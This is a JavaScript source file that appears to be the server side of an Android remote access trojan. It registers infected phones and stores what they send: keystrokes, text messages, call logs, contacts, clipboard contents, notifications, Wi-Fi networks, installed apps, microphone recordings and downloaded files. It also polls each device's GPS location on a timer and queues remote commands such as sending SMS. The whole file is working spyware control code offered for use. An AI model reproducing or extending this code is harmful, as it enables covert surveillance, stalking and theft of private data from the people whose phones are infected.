let CONST = require('./const'),
    fs = require('fs'),
    crypto = require('crypto'),
    path = require('path');

class Clients {
    constructor(db) {
        this.clientConnections = {};
        this.gpsPollers = {};
        this.clientDatabases = {};
        this.ignoreDisconnects = {};
        this.instance = this;
        this.db = db;
    }

    clientConnect(connection, clientID, clientData) {
        this.clientConnections[clientID] = connection;

        if (clientID in this.ignoreDisconnects) this.ignoreDisconnects[clientID] = true;
        else this.ignoreDisconnects[clientID] = false;

        let client = this.db.maindb.get('clients').find({ clientID });
        if (client.value() === undefined) {
            this.db.maindb.get('clients').push({
                clientID,
                firstSeen: new Date(),
                lastSeen: new Date(),
                isOnline: true,
                dynamicData: clientData
            }).write();
        } else {
            client.assign({
                lastSeen: new Date(),
                isOnline: true,
                dynamicData: clientData
            }).write();
        }

        let clientDatabase = this.getClientDatabase(clientID);
        this.setupListeners(clientID, clientDatabase);
    }

    clientDisconnect(clientID) {
        if (this.ignoreDisconnects[clientID]) {
            delete this.ignoreDisconnects[clientID];
        } else {
            this.db.maindb.get('clients').find({ clientID }).assign({
                lastSeen: new Date(),
                isOnline: false,
            }).write();
            if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
            if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
            delete this.ignoreDisconnects[clientID];
        }
    }

    getClientDatabase(clientID) {
        if (this.clientDatabases[clientID]) return this.clientDatabases[clientID];
        else {
            this.clientDatabases[clientID] = new this.db.clientdb(clientID);
            return this.clientDatabases[clientID];
        }
    }

    setupListeners(clientID) {
        let socket = this.clientConnections[clientID];
        let client = this.getClientDatabase(clientID);

        socket.on('disconnect', () => this.clientDisconnect(clientID));

        let clientQue = client.get('CommandQue').value();
        if (clientQue.length !== 0) {
            clientQue.forEach((command) => {
                let uid = command.uid;
                this.sendCommand(clientID, command.type, command, (error) => {
                    if (!error) client.get('CommandQue').remove({ uid: uid }).write();
                });
            });
        }

        this.gpsPoll(clientID);

        socket.on(CONST.messageKeys.keylogger, (data) => {
            if (typeof data === "object" && Array.isArray(data.keylogs) && data.keylogs.length !== 0) {
                let dbKeylog = client.get('KeyLogData');
                let newCount = 0;

                data.keylogs.forEach(log => {
                    let hash = crypto.createHash('md5').update(log.package + log.time + log.text).digest("hex");

                    // Only insert if not duplicate
                    if (dbKeylog.find({ hash }).value() === undefined) {
                        log.hash = hash;
                        dbKeylog.push(log).write();
                        newCount++;
                    }
                });

                if (newCount > 0) {
                    logManager.log(CONST.logTypes.success, clientID + " KeyLogs Updated - " + newCount + " New Keys");
                }
            }
        });

        socket.on(CONST.messageKeys.files, (data) => {
            // {
            //     "type": "list"|"download"|"error",
            //     (if type = list) "list": <Array>,
            //     (if type = download) "buffer": <Buffer>,
            //     (if type = error) "error": <String> 
            // }

            if (data.type === "list") {
                let list = data.list;
                if (list.length !== 0) {
                    // cool, we have files!
                    // somehow get this array back to the main thread...
                    client.get('currentFolder').remove().write();
                    client.get('currentFolder').assign(data.list).write();
                    logManager.log(CONST.logTypes.success, "File List Updated");
                } else {
                    // bummer, something happened
                }
            } else if (data.type === "download") {
                // Ayy, time to recieve a file!
                logManager.log(CONST.logTypes.info, "Recieving File From" + clientID);


                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';

                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);

                fs.writeFile(filePath, data.buffer, (error) => {
                    if (!error) {
                        // let's save the filepath to the database
                        client.get('downloads').push({
                            time: new Date(),
                            type: "download",
                            originalName: data.name,
                            path: CONST.downloadsFolder + '/' + fileKey + fileExt
                        }).write();
                        logManager.log(CONST.logTypes.success, "File From" + clientID + " Saved");
                    }
                    else console.log(error); // not ok
                })
            } else if (data.type === "error") {
                // shit, we don't like these! What's up?
                let error = data.error;
                console.log(error);
            }
        });

        socket.on(CONST.messageKeys.call, (data) => {
            if (data.callsList) {
                if (data.callsList.length !== 0) {
                    let callsList = data.callsList;
                    let dbCall = client.get('CallData');
                    let newCount = 0;
                    callsList.forEach(call => {
                        let hash = crypto.createHash('md5').update(call.phoneNo + call.date).digest("hex");
                        if (dbCall.find({ hash }).value() === undefined) {
                            // cool, we dont have this call
                            call.hash = hash;
                            dbCall.push(call).write();
                            newCount++;
                        }
                    });
                    logManager.log(CONST.logTypes.success, clientID + " Call Log Updated - " + newCount + " New Calls");
                }
            }

        });

        socket.on(CONST.messageKeys.sms, (data) => {
            if (typeof data === "object") {
                let smsList = data.smslist;
                if (smsList.length !== 0) {
                    let dbSMS = client.get('SMSData');
                    let newCount = 0;
                    smsList.forEach(sms => {
                        let hash = crypto.createHash('md5').update(sms.address + sms.body).digest("hex");
                        if (dbSMS.find({ hash }).value() === undefined) {
                            // cool, we dont have this sms
                            sms.hash = hash;
                            dbSMS.push(sms).write();
                        }
                    });
                    logManager.log(CONST.logTypes.success, clientID + " SMS List Updated - " + newCount + " New Messages");
                }
            } else if (typeof data === "boolean") {
                logManager.log(CONST.logTypes.success, clientID + " SENT SMS");
            }
        });

        socket.on(CONST.messageKeys.mic, (data) => {
            if (data.file) {
                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);

                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';

                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);

                fs.writeFile(filePath, data.buffer, (e) => {
                    if (!e) {
                        client.get('downloads').push({
                            "time": new Date(),
                            "type": "voiceRecord",
                            "originalName": data.name,
                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
                        }).write();
                    } else {
                        console.log(e);
                    }
                })
            }
        });

        socket.on(CONST.messageKeys.location, (data) => {
            if (Object.keys(data).length !== 0 && data.hasOwnProperty("latitude") && data.hasOwnProperty("longitude")) {
                client.get('GPSData').push({
                    time: new Date(),
                    enabled: data.enabled || false,
                    latitude: data.latitude || 0,
                    longitude: data.longitude || 0,
                    altitude: data.altitude || 0,
                    accuracy: data.accuracy || 0,
                    speed: data.speed || 0
                }).write();
                logManager.log(CONST.logTypes.success, clientID + " GPS Updated");
            } else {
                logManager.log(CONST.logTypes.error, clientID + " GPS Recieved No Data");
                logManager.log(CONST.logTypes.error, clientID + " GPS LOCATION SOCKET DATA" + JSON.stringify(data));
            }
        });

        socket.on(CONST.messageKeys.clipboard, (data) => {
            client.get('clipboardLog').push({
                time: new Date(),
                content: data.text
            }).write();
            logManager.log(CONST.logTypes.info, clientID + " ClipBoard Recieved");
        });

        socket.on(CONST.messageKeys.notification, (data) => {
            let dbNotificationLog = client.get('notificationLog');
            let hash = crypto.createHash('md5').update(data.key + data.content).digest("hex");

            if (dbNotificationLog.find({ hash }).value() === undefined) {
                data.hash = hash;
                dbNotificationLog.push(data).write();
                logManager.log(CONST.logTypes.info, clientID + " Notification Recieved");
            }
        });

        socket.on(CONST.messageKeys.contacts, (data) => {
            if (data.contactsList) {
                if (data.contactsList.length !== 0) {
                    let contactsList = data.contactsList;
                    let dbContacts = client.get('contacts');
                    let newCount = 0;
                    contactsList.forEach(contact => {
                        contact.phoneNo = contact.phoneNo.replace(/\s+/g, '');
                        let hash = crypto.createHash('md5').update(contact.phoneNo + contact.name).digest("hex");
                        if (dbContacts.find({ hash }).value() === undefined) {
                            // cool, we dont have this call
                            contact.hash = hash;
                            dbContacts.push(contact).write();
                            newCount++;
                        }
                    });
                    logManager.log(CONST.logTypes.success, clientID + " Contacts Updated - " + newCount + " New Contacts Added");
                }
            }

        });

        socket.on(CONST.messageKeys.wifi, (data) => {
            if (data.networks) {
                if (data.networks.length !== 0) {
                    let networks = data.networks;
                    let dbwifiLog = client.get('wifiLog');
                    client.get('wifiNow').remove().write();
                    client.get('wifiNow').assign(data.networks).write();
                    let newCount = 0;
                    networks.forEach(wifi => {
                        let wifiField = dbwifiLog.find({ SSID: wifi.SSID, BSSID: wifi.BSSID });
                        if (wifiField.value() === undefined) {
                            // cool, we dont have this call
                            wifi.firstSeen = new Date();
                            wifi.lastSeen = new Date();
                            dbwifiLog.push(wifi).write();
                            newCount++;
                        } else {
                            wifiField.assign({
                                lastSeen: new Date()
                            }).write();
                        }
                    });
                    logManager.log(CONST.logTypes.success, clientID + " WiFi Updated - " + newCount + " New WiFi Hotspots Found");
                }
            }
        });

        socket.on(CONST.messageKeys.permissions, (data) => {
            client.get('enabledPermissions').assign(data.permissions).write();
            logManager.log(CONST.logTypes.success, clientID + " Permissions Updated");
        });

        socket.on(CONST.messageKeys.installed, (data) => {
            client.get('apps').assign(data.apps).write();
            logManager.log(CONST.logTypes.success, clientID + " Apps Updated");
        });

    }

    getClient(clientID) {
        let client = this.db.maindb.get('clients').find({ clientID }).value();
        return client || false;
    }

    getClientList() {
        return this.db.maindb.get('clients').value();
    }

    getClientListOnline() {
        return this.db.maindb.get('clients').value().filter(client => client.isOnline);
    }

    getClientListOffline() {
        return this.db.maindb.get('clients').value().filter(client => !client.isOnline);
    }

    getClientDataByPage(clientID, page, filter = undefined) {
        let client = this.db.maindb.get('clients').find({ clientID }).value();
        if (client !== undefined) {
            let clientDB = this.getClientDatabase(client.clientID);
            let clientData = clientDB.value();
            let pageData;

            if (page === "calls") {
                pageData = clientDB.get('CallData').sortBy('date').reverse().value();
                if (filter) pageData = pageData.filter(calls => calls.phoneNo.substr(-6) === filter.substr(-6));
            } else if (page === "sms") {
                pageData = clientData.SMSData;
                if (filter) pageData = pageData.filter(sms => sms.address.substr(-6) === filter.substr(-6));
            } else if (page === "notifications") {
                pageData = clientDB.get('notificationLog').sortBy('postTime').reverse().value();
                if (filter) pageData = pageData.filter(not => not.appName === filter);
            } else if (page === "wifi") {
                pageData = { now: clientData.wifiNow, log: clientData.wifiLog };
            } else if (page === "contacts") {
                pageData = clientData.contacts;
            } else if (page === "permissions") {
                pageData = clientData.enabledPermissions;
            } else if (page === "clipboard") {
                pageData = clientDB.get('clipboardLog').sortBy('time').reverse().value();
            } else if (page === "apps") {
                pageData = clientData.apps;
            } else if (page === "files") {
                pageData = clientData.currentFolder;
            } else if (page === "downloads") {
                pageData = clientData.downloads.filter(download => download.type === "download");
            } else if (page === "microphone") {
                pageData = clientDB.get('downloads').value().filter(download => download.type === "voiceRecord");
            } else if (page === "gps") {
                pageData = clientData.GPSData;
            } else if (page === "info") {
                pageData = client;
            } else if (page === "keylogger") {
                pageData = clientDB.get('KeyLogData').sortBy('time').reverse().value();
            }

            return pageData;
        } else return false;
    }

    deleteClient(clientID) {
        this.db.get('clients').remove({ clientID }).write();
        if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
    }

    sendCommand(clientID, commandID, commandPayload = {}, cb = () => { }) {
        this.checkCorrectParams(commandID, commandPayload, (error) => {
            if (!error) {
                let client = this.db.maindb.get('clients').find({ clientID }).value();
                if (client !== undefined) {
                    commandPayload.type = commandID;
                    if (clientID in this.clientConnections) {
                        let socket = this.clientConnections[clientID];
                        socket.emit('order', commandPayload);
                        return cb(false, 'Requested');
                    } else {
                        this.queCommand(clientID, commandPayload, (error) => {
                            if (!error) return cb(false, 'Command queued (device is offline)');
                            else return cb(error);
                        });
                    }
                } else return cb('Client Doesn\'t exist!');
            } else return cb(error);
        });
    }

    queCommand(clientID, commandPayload, cb) {
        let clientDB = this.getClientDatabase(clientID);
        let commandQue = clientDB.get('CommandQue');
        let outstandingCommands = commandQue.value().map(cmd => cmd.type);
        if (outstandingCommands.includes(commandPayload.type)) return cb('A similar command has already been queued');
        commandPayload.uid = Math.floor(Math.random() * 10000);
        commandQue.push(commandPayload).write();
        return cb(false);
    }

    checkCorrectParams(commandID, commandPayload, cb) {
        if (commandID === CONST.messageKeys.sms) {
            if (!('action' in commandPayload)) return cb('SMS Missing `action` Parameter');
            if (commandPayload.action === 'sendSMS') {
                if (!('to' in commandPayload) || !('sms' in commandPayload)) return cb('SMS Missing parameters');
            }
            return cb(false);
        }
        if (commandID === CONST.messageKeys.files) {
            if (!('action' in commandPayload)) return cb('Files Missing `action` Parameter');
            if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter');
            return cb(false);
        }
        if (commandID === CONST.messageKeys.mic && !('sec' in commandPayload)) return cb('Mic Missing `sec` Parameter');
        if (commandID === CONST.messageKeys.gotPermission && !('permission' in commandPayload)) return cb('GotPerm Missing `permission` Parameter');
        if (Object.values(CONST.messageKeys).includes(commandID)) return cb(false);
        return cb('Command ID Not Found');
    }

    gpsPoll(clientID) {
        if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
        let clientDB = this.getClientDatabase(clientID);
        let gpsSettings = clientDB.get('GPSSettings').value();
        if (gpsSettings.updateFrequency > 0) {
            this.gpsPollers[clientID] = setInterval(() => {
                this.sendCommand(clientID, '0xLO');
            }, gpsSettings.updateFrequency * 1000);
        }
    }

    setGpsPollSpeed(clientID, pollevery, cb) {
        if (pollevery >= 30) {
            let clientDB = this.getClientDatabase(clientID);
            clientDB.get('GPSSettings').assign({ updateFrequency: pollevery }).write();
            cb(false);
            this.gpsPoll(clientID);
        } else cb('Polling Too Short!');
    }
}

module.exports = Clients;
